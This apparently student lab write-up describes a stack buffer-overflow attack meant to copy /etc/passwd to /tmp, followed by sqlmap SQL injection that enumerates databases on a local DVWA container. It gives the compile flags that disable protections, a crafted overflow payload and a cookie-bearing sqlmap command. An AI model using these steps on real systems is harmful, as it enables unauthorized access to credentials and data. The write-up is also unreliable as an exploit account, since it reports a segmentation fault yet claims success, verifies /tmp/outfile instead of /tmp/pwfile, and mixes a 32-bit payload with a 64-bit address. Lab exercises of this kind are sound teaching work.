```
**Question 1**:
- Compile asm program and C program to executable code. 
- Conduct the attack so that when C program is executed, the /etc/passwd file is copied to /tmp/pwfile. You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
  
**Answer 1**: Must conform to below structure:

## 1.Create a Vulnerable C Program

```bash
nano redundant_code.c
```
![image](https://github.com/user-attachments/assets/0d94ee81-f71f-4dc8-a03d-883b2a0b054c)


Create a C program that contains a buffer overflow vulnerability

## 2.  Compile the C Program

```bash
gcc -o redundant_code redundant_code.c -fno-stack-protector -z execstack
```
![image](https://github.com/user-attachments/assets/4c9ded45-326f-4199-91ff-d169428f5b97)

Run by gcc
- -fno-stack-protector: Disables stack protection.
- -z execstack: Marks the stack as executabl

## 3. Create the Assembly Payload

* Now, create an assembly program that will copy /etc/passwd to /tmp/pwfile. Hereâ€™s the assembly code

```bash
nano asm_code.asm
```
![image](https://github.com/user-attachments/assets/7efe0060-afab-4438-97b4-140d2497bb32)

## 4. Compile the Assembly Code 

* Save the assembly code in a file named asm_code.asm, and then assemble and link it:

```bash
nasm -f elf32 -o asm_code.o asm_code.asm
ld -m elf_i386 -o asm_code asm_code.o
```
![image](https://github.com/user-attachments/assets/d9e73715-0fd3-4efb-9992-71930bda3b1c)

## 5. Load redundant_code  to gdb

```bash
gdb ./redundant_code
```
You need to find the address of the `redundant_code` binary in memory. This address will be used in the exploit string to redirect execution to the payload. To do this, you can use a debugger like `gdb`:
## 6. Finding the Address of the Payload


```bash
break redundant_code
run $(python -c "print('A'*72)")
p &buffer
```
![image](https://github.com/user-attachments/assets/36f0874d-2122-46a6-8730-2c01e085cdef)

![image](https://github.com/user-attachments/assets/cfb563e9-a78f-476c-b633-ef624a9935c2)

![image](https://github.com/user-attachments/assets/f53071fa-d402-4fc9-a824-a2de2da75055)



Inside `gdb`, set a breakpoint in the `redundant_code`, run the program with a dummy argument, and find the address of your payload. This will typically be after the buffer size.

Make a note of the address is `0x7ffff7fb9278`; you'll use it in the next step.

## 7. Execute the Vulnerable Program with the Payload

Run the vulnerable program with the crafted payload:

```bash
./redundant_code "$(python3 -c "print('a'*72 + '\x78\x92\xfb\xf7\xff\x7f')")"
```

Generated a string of 72 'a' characters followed by a byte sequence intended to manipulate the program's execution flow. The output resulted in a "Segmentation fault (core dumped)," confirming the presence of a buffer overflow vulnerability in the redundant_code program.

## 8. Verify the Output

```bash
cat /tmp/outfile
```

![image](https://github.com/user-attachments/assets/158a608a-2eae-4942-bf73-d128b2a41a0b)



 The /etc/passwd file is copied to /tmp/outfile.



`Conclusion `: In this exercise, I successfully demonstrated how exploiting vulnerabilities in a C program using a Code Injection or Environment Variable attack can lead to unauthorized actions, such as copying the /etc/passwd file to /tmp/pwfile. This highlights the critical importance of secure coding practices, input validation, and system-level protections like ASLR and stack canaries. Proper permissions and security measures are essential to prevent such attacks and protect sensitive data.


# Task 2: Attack on database of DVWA
- Install dvwa (on host machine or docker container)
- Make sure you can login with default user
- Install sqlmap
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:
1.  Pull the DVWA Docker image

Set up the eviroment 

```bash
docker pull vulnerables/web-dvwa
docker run -d -p 8080:80 vulnerables/web-dvwa
```
run the dvwa container at port 8080

2. Access DVWA

Open a web browser and go to: http://localhost:8080
Log in with the default credentials:

Username: admin

Password: password

This is page Login to DVWA

![image](https://github.com/user-attachments/assets/43271ead-00d7-44a4-8a6f-6de199cd4566)


This home page to set up database

3. Install SQLMap in WSL

```bash
wsl
sudo apt install sqlmap
```

4. Fetch the url of webiste you want to attack

![image](https://github.com/user-attachments/assets/933ada14-04f2-4006-a3cd-c6d502a63515)

Change the DVWA security to Medium (default: Low)
![image](https://github.com/user-attachments/assets/5b7fd915-141b-4c37-8188-6721a09b9cc5)


Enter any value for this to retun a url : `http://localhost/vulnerabilities/sqli/?id=2`

5. Get information about all available databases


![image](https://github.com/user-attachments/assets/6fe65cb0-f62d-4a0e-8b42-89f65bf88927)


Get cookie value of website: PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770


```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli" --cookie="PHPSESSID=bfnm4a8n1ntq0tobf18n6fj770; security=low " --data="id=1&Submit=Submit" --dbs
```

![image](https://github.com/user-attachments/assets/fed822f7-00be-4b8d-8176-ec7a79265298)


Return 2 available databases named : dvwa and information_schema
